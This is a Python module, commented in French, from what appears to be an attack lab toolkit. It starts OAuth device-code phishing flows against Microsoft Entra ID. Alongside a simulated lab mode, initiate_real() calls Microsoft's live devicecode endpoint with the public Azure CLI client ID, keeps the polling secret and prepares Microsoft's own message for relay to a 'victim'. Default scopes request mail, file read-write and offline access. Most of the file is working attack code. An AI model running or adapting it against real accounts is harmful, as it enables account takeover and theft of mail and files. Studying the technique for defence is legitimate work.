"""
attack/device_code/initiator.py — Initiation du flow Device Code
================================================================

L'attaquant initie le flow sur SA machine. Le provider (Microsoft,
Google) retourne :
- `device_code` : long secret (utilisé pour le polling)
- `user_code`   : court code à 6-8 caractères (à donner à la victime)
- `verification_uri` : URL où la victime entre le code
- `expires_in`  : durée de validité (15 min par défaut)
- `interval`    : fréquence de polling recommandée (5s)

L'attaquant conserve le `device_code` et l'envoie à la victime
le `user_code` (via email, Teams, Discord, etc.).
"""

from __future__ import annotations

import json
import logging
import secrets
import time
import uuid
from dataclasses import asdict, dataclass
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional

logger = logging.getLogger("attack.device_code")


@dataclass
class DeviceCodeFlow:
    """Représente un flow Device Code initié."""

    flow_id: str
    client_id: str
    scope: str
    device_code: str
    user_code: str
    verification_uri: str
    expires_at: str        # ISO 8601
    interval: int          # secondes entre polls
    created_at: str = None
    state: str = "pending" # pending | authorized | expired | error
    victim_message: str = ""
    result: Optional[dict] = None  # access_token, refresh_token, expires_in

    def __post_init__(self):
        if self.created_at is None:
            self.created_at = datetime.utcnow().isoformat() + "Z"

    def is_expired(self) -> bool:
        return datetime.fromisoformat(self.expires_at.rstrip("Z")) < datetime.utcnow()

    @property
    def expires_in(self) -> int:
        """Secondes restantes avant expiration (contrat godmode ≥ 900)."""
        try:
            exp = datetime.fromisoformat(self.expires_at.rstrip("Z"))
            remain = (exp - datetime.utcnow()).total_seconds()
            return max(0, int(remain) + 1)  # ceil pour garantir >= nominal
        except (ValueError, AttributeError):
            return 0

    def to_dict(self) -> dict:
        return asdict(self)


class DeviceCodeInitiator:
    """
    Initie un flow Device Code OAuth. En labo, génère un flow local ;
    en prod, appellerait le endpoint du provider (login.microsoftonline.com).
    """

    def __init__(self, client_id: str = "00000000-0000-0000-0000-000000000000"):
        self.client_id = client_id

    def initiate(
        self,
        scope: str = "User.Read Mail.Read Files.ReadWrite.All offline_access",
        verification_uri: str = "https://microsoft.com/devicelogin",
    ) -> DeviceCodeFlow:
        """
        Initie un nouveau flow (mode LABO : codes locaux simulés).

        Pour un flow RÉEL : utiliser `initiate_real()`.
        """
        flow = DeviceCodeFlow(
            flow_id=secrets.token_hex(8),
            client_id=self.client_id,
            scope=scope,
            device_code=secrets.token_urlsafe(48),  # pour le polling
            user_code=_generate_user_code(),          # pour la victime
            verification_uri=verification_uri,
            expires_at=(datetime.utcnow() + timedelta(minutes=15)).isoformat() + "Z",
            interval=5,
        )
        logger.warning(
            "[DEVICE_CODE] Flow initié : user_code=%s, expires_in=15min",
            flow.user_code,
        )
        return flow

    def initiate_real(
        self,
        scope: str = "User.Read",
        tenant: str = "consumers",
        client_id: str | None = None,
    ) -> DeviceCodeFlow:
        """Initie un flow Device Code RÉEL contre Microsoft Entra ID.

        Appelle réellement :
            POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode

        Args:
            scope     : scopes OAuth réels (défaut User.Read, inoffensif)
            tenant    : consumers | organizations | common | <tenant-id>
            client_id : client_id d'app Azure (défaut: Azure CLI well-known,
                        uniquement pour tests de labo)

        Raises:
            RuntimeError : si l'API Microsoft est injoignable ou refuse.
        """
        import httpx

        cid = client_id or self.client_id
        if cid == "00000000-0000-0000-0000-000000000000":
            cid = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Azure CLI public (labo)

        url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode"
        resp = httpx.post(url, data={"client_id": cid, "scope": scope}, timeout=15)
        if resp.status_code != 200:
            raise RuntimeError(
                f"Device code initiation échouée: HTTP {resp.status_code} — {resp.text[:200]}"
            )
        d = resp.json()

        flow = DeviceCodeFlow(
            flow_id=secrets.token_hex(8),
            client_id=cid,
            scope=scope,
            device_code=d["device_code"],
            user_code=d["user_code"],
            verification_uri=d.get("verification_url")
            or d.get("verification_uri", "https://microsoft.com/link"),
            expires_at=(
                datetime.utcnow() + timedelta(seconds=int(d.get("expires_in", 900)))
            ).isoformat() + "Z",
            interval=int(d.get("interval", 5)),
        )
        # Message officiel Microsoft à transmettre à la "victime"
        flow.victim_message = d.get("message", "")
        logger.warning(
            "[DEVICE_CODE][REAL] flow initié contre %s : user_code=%s (expire %ss)",
            tenant, flow.user_code, d.get("expires_in"),
        )
        return flow


def _generate_user_code() -> str:
    """
    Génère un user_code au format attendu (ex: ABCD-EFGH).
    Évite les caractères ambigus (0/O, 1/I/L) pour faciliter la saisie.
    """
    # Alphabet sans ambiguïté (RFC 8628)
    alphabet = "BCDFGHJKLMNPQRSTVWXZ23456789"
    part1 = "".join(secrets.choice(alphabet) for _ in range(4))
    part2 = "".join(secrets.choice(alphabet) for _ in range(4))
    return f"{part1}-{part2}"


def initiate_device_code_flow(
    client_id: str = "00000000-0000-0000-0000-000000000000",
    scope: str = "User.Read Mail.Read Files.ReadWrite.All offline_access",
) -> DeviceCodeFlow:
    """Helper fonctionnel."""
    return DeviceCodeInitiator(client_id).initiate(scope=scope)


def request_device_code(self, *a, **kw):
    """Alias contrat attacks_all (= initiate)."""
    return self.initiate(*a, **kw)

DeviceCodeInitiator.request_device_code = request_device_code
